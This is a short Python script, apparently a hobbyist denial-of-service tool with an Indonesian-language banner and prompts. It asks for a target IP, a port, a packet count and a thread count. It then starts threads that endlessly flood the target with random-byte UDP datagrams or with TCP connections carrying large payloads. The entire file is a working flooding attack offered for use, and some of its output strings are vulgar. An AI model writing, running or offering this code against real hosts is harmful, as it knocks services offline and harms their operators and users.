#Autor By Cyber
import random
import socket
import threading
import os

os.system("clear")
print("#-- DOOS BY THE LAWRANCE --#")
print(" Jan Abuse Dek ")
print("""\033[91m
 █░░ ▄▀▄ █░░░█ █▀▀▄ ▄▀▄ █▄░█ ▄▀ █▀▀
 █░▄ █▀█ █░█░█ █▐█▀ █▀█ █░▀█ █░ █▀▀
 ▀▀▀ ▀░▀ ░▀░▀░ ▀░▀▀ ▀░▀ ▀░░▀ ░▀ ▀▀▀  
""")
ip = str(input("\033[94m Ip target \033[1;31;40m  ====> : "))
port = int(input(" \033[94mPort Target \033[1;31;40m====> : "))
choice = str(input(" Gas Ddos Gak ni?(y/n): "))
times = int(input(" Mau Berapa Packets?: "))
threads = int(input(" Isi Packets Threads?: "))
def run():
	data = random._urandom(20000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Xenju Nih Dek!!!")
		except:
			print("[!] Down Kontol!!!")

def run2():
	data = random._urandom(696969)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Xenju!!!")
		except:
			s.close()
			print("[*] Xenju Nih dek")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
